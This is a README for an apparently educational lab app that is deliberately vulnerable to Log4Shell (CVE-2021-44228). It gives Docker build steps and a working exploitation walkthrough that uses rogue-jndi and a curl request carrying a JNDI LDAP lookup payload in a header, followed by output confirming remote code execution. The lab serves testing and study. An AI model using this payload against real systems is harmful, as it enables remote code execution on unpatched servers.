# Log4Shell sample vulnerable application (CVE-2021-44228)

This is an almost copy/similar vulnerable application to https://github.com/christophetd/log4shell-vulnerable-app

The main differences are maven instead of gradle, and the usage of rogue-jndi.

This repository contains a maven Spring Boot web application vulnerable to CVE-2021-44228, nicknamed [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses Log4j 2.6.1 and tJDK 1.8.0_181.

## Running the springboot application

Build and run the docker springboot application:

```bash
docker build . -t vulnerable-app
docker run -p 8080:8080 vulnerable-app
```

## Exploitation
1. `git clone https://github.com/veracode-research/rogue-jndi`
2. `cd rogue-jndi`
3. `mvn package`
4. `java -jar target/RogueJndi-1.1.jar --command "touch /tmp/test_if_rce" --hostname "192.168.1.x"`

Open a second terminal

5. `curl localhost:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.x:1389/o=reference}'`

Where in both cases 192.168.1.x is your IP

`NOTE: don't use localhost, use your actual private IP address.
`

Now check if RCE was succesful:
```sh
$ docker ps                                 
CONTAINER ID   IMAGE            COMMAND                  CREATED         STATUS         PORTS                                       NAMES
04536dbd1dff   vulnerable-app   "java -jar demo-0.0.…"   2 minutes ago   Up 2 minutes   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   gallant_easley
```

```sh
$ docker container exec -it 04536dbd1dff ash
/opt/app # ls /tmp
hsperfdata_root                          tomcat-docbase.8080.4585569232401237075
test_if_rce                              tomcat.8080.1707298461175346507
```

As you can see, the file `test_if_rce` exists. Which means RCE was succesful.

## NOTE

Code and ideas have been used from the following repositories:

- https://github.com/rayhan0x01/log4shell-vulnerable-app/tree/mod

- https://www.lunasec.io/docs/blog/log4j-zero-day/

- https://github.com/christophetd/log4shell-vulnerable-app
